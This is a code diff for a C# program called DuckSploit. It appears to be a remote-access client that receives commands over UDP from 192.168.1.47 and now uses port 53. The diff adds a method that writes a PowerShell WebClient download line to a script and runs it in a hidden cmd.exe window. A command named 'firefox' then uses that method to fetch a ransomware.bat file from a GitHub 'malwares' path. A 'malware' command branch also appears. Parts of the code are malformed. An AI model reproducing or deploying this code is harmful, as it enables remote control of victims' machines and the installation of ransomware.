@@ -7,14 +7,61 @@ using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Collections.Generic;
-// using System.Linq;
+
 using System.Web;
+using System.Threading;
+
 
 
 namespace DuckSploit
 {
 	public class Program
-	{
+	{		
+					
+		 public static void Download(string url, string outPath)
+		{
+			url = '"' + url + '"';
+			
+			outPath = '"' + outPath + '"';
+			
+			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
+			
+			outPath = "C:/temp/download.ps1";
+			
+            // open or create file
+            FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
+            // create stream writer
+            StreamWriter streamwrite = new StreamWriter(streamfile);
+            // add some lines
+			
+			outPath = '"' + "C:/temp/download.ps1" + '"';
+			
+			
+			// string powershelldownloadtxt = "" + url +"\  "
+            streamwrite.WriteLine(str);
+            // clear streamwrite data
+            streamwrite.Flush();
+            // close stream writer
+            streamwrite.Close();
+            // close stream file
+            streamfile.Close();
+			
+
+			// string error = "";
+			// int exitCode = 0;
+			string output = "";
+			
+			ProcessStartInfo processInfo;
+			Process process;
+			processInfo = new ProcessStartInfo("cmd.exe", "/c powershell C:/temp/download.ps1");
+			processInfo.CreateNoWindow = true;
+			processInfo.UseShellExecute = false;
+			processInfo.RedirectStandardOutput = true;
+			process = Process.Start(processInfo);
+			process.WaitForExit();
+			output = process.StandardOutput.ReadToEnd();
+			
+		}
 		public void CreateFileaAndWrite()
         {
             // get path
@@ -24,16 +71,9 @@ namespace DuckSploit
             // create stream writer
             StreamWriter streamwrite = new StreamWriter(streamfile);
             // add some lines
-			// var request = WebRequest.Create("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/malwares/ransomware.bat");
 			
-			using (WebClient web1 = new WebClient())
-			string data = web1.DownloadString(new Uri("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/malwares/ransomware.bat"));
-			Console.WriteLine(data);
 			
-            // streamwrite.WriteLine("Forbidden speak in this line.");
-            // streamwrite.WriteLine("Forbidden be quiet in this line.");
-            // streamwrite.WriteLine("Sleeping in this line may only be possible by silence of the second line.");
-            streamwrite.WriteLine(data);
+            streamwrite.WriteLine("test");
             // clear streamwrite data
             streamwrite.Flush();
             // close stream writer
@@ -41,13 +81,21 @@ namespace DuckSploit
             // close stream file
             streamfile.Close();
         }
+		
+		
+		
+		
+		
+		
+		
 		public static void Main(string[] args)
 		{
+			string output = "";
 
 			UdpClient udpClient = new UdpClient(0);
 
 			try{
-				udpClient.Connect("192.168.1.47", 8015);
+				udpClient.Connect("192.168.1.47", 53);
 
 				Byte[] sendBytes = Encoding.ASCII.GetBytes("Connected!");
 
@@ -66,12 +114,9 @@ namespace DuckSploit
 					
 					
 
-					string output = "";
-					string error = "";
-					int exitCode = 0;
 					
-					ProcessStartInfo processInfo;
-					Process process;
+					
+					
 					
 					
 					string[] result = returnData.Split(' ');
@@ -88,22 +133,12 @@ namespace DuckSploit
 					}
 					else if(result[0] == "firefox")
 					{
-						Program p = new Program();
-						p.CreateFileaAndWrite(); // Calling method
+						Download("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/malwares/ransomware.bat", "C:/temp/ransomware.bat"); // Calling method
 						
 						
 						
 						
-						processInfo = new ProcessStartInfo("cmd.exe", "/c call a.bat");
-						processInfo.CreateNoWindow = true;
-						processInfo.UseShellExecute = false;
-						processInfo.RedirectStandardError = true;
-						processInfo.RedirectStandardOutput = true;
-						process = Process.Start(processInfo);
-						process.WaitForExit();
-						output = process.StandardOutput.ReadToEnd();
-						error = process.StandardError.ReadToEnd();
-						exitCode = process.ExitCode;
+						
 					}
 					else if(result[0] == "malware")
 					{
